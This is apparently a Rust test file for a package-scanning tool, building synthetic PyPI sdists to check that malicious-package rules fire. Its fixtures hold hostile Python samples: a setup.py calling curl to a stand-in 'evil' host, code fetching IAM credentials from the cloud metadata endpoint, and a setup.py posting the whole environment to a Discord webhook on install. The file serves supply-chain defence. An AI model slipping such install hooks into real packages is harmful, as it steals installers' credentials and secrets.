//! End-to-end PyPI-rule tests against synthetic sdists.

use flate2::write::GzEncoder;
use flate2::Compression;
use monomi_core::{
    AnalysisCtx, ArtifactId, Corpus, Ecosystem, EcosystemId, HashAlgo, Integrity, Stage1Verdict,
};
use monomi_pypi::PypiEcosystem;
use monomi_rules::{default_ruleset, run};
use tar::{Builder, Header};

fn build_sdist(prefix: &str, files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut gz = GzEncoder::new(Vec::new(), Compression::default());
    {
        let mut b = Builder::new(&mut gz);
        for (path, data) in files {
            let full = format!("{prefix}/{path}");
            let mut h = Header::new_gnu();
            h.set_path(&full).unwrap();
            h.set_size(data.len() as u64);
            h.set_mode(0o644);
            h.set_cksum();
            b.append(&h, *data).unwrap();
        }
        b.finish().unwrap();
    }
    gz.finish().unwrap()
}

fn analyze(bytes: Vec<u8>) -> monomi_core::Stage1Result {
    let tar = monomi_core::Tarball {
        source_url: None,
        bytes,
    };
    let eco = PypiEcosystem::new();
    let manifest = eco.parse_manifest(&tar).unwrap();
    let lifecycle = eco.lifecycle_entrypoints(&tar, &manifest).unwrap();
    let entries = eco.walk(&tar).unwrap();
    let artifact = ArtifactId {
        ecosystem: EcosystemId::Pypi,
        name: manifest.name.clone(),
        version: manifest.version.clone(),
        integrity: Integrity::from_bytes(HashAlgo::Sha256, &tar.bytes),
    };
    let corpus = Corpus::default();
    let ctx = AnalysisCtx {
        artifact: &artifact,
        manifest: &manifest,
        lifecycle: &lifecycle,
        entries: &entries,
        diff: None,
        registry: None,
        corpus: &corpus,
    };
    run(&default_ruleset(), &ctx).stage1
}

#[test]
fn benign_setup_py_only_fires_pypi001() {
    let pyproject = br#"
[project]
name = "x"
version = "0.0.1"
[build-system]
requires = ["setuptools"]
build-backend = "setuptools.build_meta"
    "#;
    let setup_py = b"from setuptools import setup\nsetup()\n";
    let bytes = build_sdist(
        "x-0.0.1",
        &[
            ("pyproject.toml", pyproject.as_slice()),
            ("setup.py", setup_py.as_slice()),
            ("x/__init__.py", b"".as_slice()),
        ],
    );
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert_eq!(ids, vec!["PYPI001"]);
    assert_eq!(s.verdict, Stage1Verdict::Clean);
}

#[test]
fn setup_py_with_subprocess_fires_pypi002() {
    let pyproject = br#"
[project]
name = "spawner"
version = "0.0.1"
[build-system]
requires = ["setuptools"]
build-backend = "setuptools.build_meta"
    "#;
    let setup_py = br#"
from setuptools import setup
import subprocess
subprocess.run(["curl", "http://evil/"])
setup()
    "#;
    let bytes = build_sdist(
        "spawner-0.0.1",
        &[
            ("pyproject.toml", pyproject.as_slice()),
            ("setup.py", setup_py.as_slice()),
        ],
    );
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"PYPI002"), "expected PYPI002, got {ids:?}");
}

#[test]
fn cloud_metadata_in_py_source_is_blocked() {
    let pyproject = br#"
[project]
name = "stealer"
version = "0.0.1"
[build-system]
requires = ["setuptools"]
build-backend = "setuptools.build_meta"
    "#;
    let src = br#"
import urllib.request
def grab():
    return urllib.request.urlopen("http://169.254.169.254/latest/meta-data/iam/security-credentials/").read()
    "#;
    let bytes = build_sdist(
        "stealer-0.0.1",
        &[
            ("pyproject.toml", pyproject.as_slice()),
            ("stealer/__init__.py", src.as_slice()),
        ],
    );
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(
        ids.contains(&"NPM006"),
        "expected NPM006 to fire on pypi too, got {ids:?}"
    );
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn discord_webhook_in_setup_py_is_blocked() {
    let pyproject = br#"
[project]
name = "leaker"
version = "0.0.1"
[build-system]
requires = ["setuptools"]
build-backend = "setuptools.build_meta"
    "#;
    let setup_py = br#"
import os, requests
from setuptools import setup
requests.post("https://discord.com/api/webhooks/12345/abcdef", json=dict(env=dict(os.environ)))
setup()
    "#;
    let bytes = build_sdist(
        "leaker-0.0.1",
        &[
            ("pyproject.toml", pyproject.as_slice()),
            ("setup.py", setup_py.as_slice()),
        ],
    );
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM007"), "expected NPM007, got {ids:?}");
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn non_stdlib_build_backend_is_suspicious() {
    let pyproject = br#"
[project]
name = "shady-be"
version = "0.0.1"
[build-system]
requires = ["evil_backend"]
build-backend = "evil_backend.api"
    "#;
    let bytes = build_sdist(
        "shady-be-0.0.1",
        &[("pyproject.toml", pyproject.as_slice())],
    );
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    // PYPI001 fires for the synthesized build-backend lifecycle.
    // No PYPI002 because the body is just `build-backend = ...`
    // (no dangerous primitive call inline).
    assert!(ids.contains(&"PYPI001"), "expected PYPI001, got {ids:?}");
}
